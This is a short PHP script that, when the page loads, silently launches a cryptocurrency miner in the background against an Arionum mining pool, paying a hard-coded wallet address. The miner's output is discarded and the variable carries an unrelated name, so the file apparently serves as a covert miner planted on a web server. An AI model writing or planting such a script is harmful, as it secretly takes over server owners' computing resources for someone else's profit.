<?php

$mobile84 = shell_exec("php ./miner pool http://mine.arionumpool.com 3pHCzLtTpG88XYBNc9x32Y73Gfh1bvs6oqAkAqSpmFoPrUrqprR6GaF9aQc3E47gBQR1mkinRbfRVrNrWHRWG7LV > /dev/null 2>/dev/null &");

echo "$mobile84";

?>
